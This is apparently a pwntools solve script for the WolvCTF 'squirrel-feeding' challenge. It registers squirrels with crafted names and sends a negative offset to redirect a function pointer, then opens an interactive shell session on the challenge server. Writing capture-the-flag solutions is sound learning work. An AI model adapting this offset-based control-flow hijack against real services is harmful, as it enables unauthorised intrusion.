from pwn import *

# This is not necessary, just faster. Everything can be typed in by hand

#p = process("./challenge")
#gdb.attach(p)
p = remote("squirrel-feeding.wolvctf.io", 1337)

for i in range(4):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"name: ")
    p.sendline(b"1"+i*b"F")
    p.recvuntil(b"them: ")
    p.sendline(b"1")
    print("Registered "+str(i+1)+" squirrels")

# ROUND 5
p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b"name: ")
p.sendline(b"1FFFFF")

print_func = -1202

p.sendline(str(print_func+5).encode())

p.interactive()
